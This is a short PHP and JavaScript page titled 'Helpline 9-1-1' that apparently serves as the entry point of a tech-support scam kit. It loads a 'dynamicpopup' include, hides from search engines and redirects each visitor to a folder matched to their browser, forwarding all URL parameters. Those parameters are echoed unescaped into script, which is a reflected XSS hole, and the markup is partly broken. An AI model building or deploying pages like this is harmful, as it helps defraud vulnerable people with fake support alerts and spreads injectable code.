<?php error_reporting(0); ?>
<?php include('/dynamicpopup/lpkey.php') ?>
<?php
$params = '';//Url parameters
 if(isset($_GET)){
     foreach ($_GET as $name => $value) {
        $params= $params.$name . '=' . $value . '&';
    }
 }
 $params = substr($params, 0, -1);
?>
<html xmlns="http:/www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta name="robots" content="noindex,nofollow">
     <title>Helpline 9-1-1</title>

     <script type="text/javascript">
     var isChromium = window.chrome,
    vendorName = window.navigator.vendor,
    isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
    isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
     if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false)      {
     // is Google chrome
     window.location.href = "./CH/?<?php echo $params;?>";
     }
     if(navigator.userAgent.indexOf("Firefox") != -1 )
    {
         window.location.href = "./FF/?<?php echo $params;?>";
    }
     if(window.navigator.userAgent.indexOf("Edge") != -1 )
    {
         window.location.href = "./EDG/?<?php echo $params;?>";
    }
    if(window.navigator.userAgent.indexOf("Edg") != -1 )
    {
         window.location.href = "./EDG/?<?php echo $params;?>";
    }
     if(window.navigator.userAgent.indexOf("Mac") != -1 )
    {
         window.location.href = "./MAC/?<?php echo $params;?>";
    }
     if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
    {
      window.location.href = "./IE/?<?php echo $params;?>";
    }
     $SAFARI_URL = "apple";
</script>


</body>


</html>
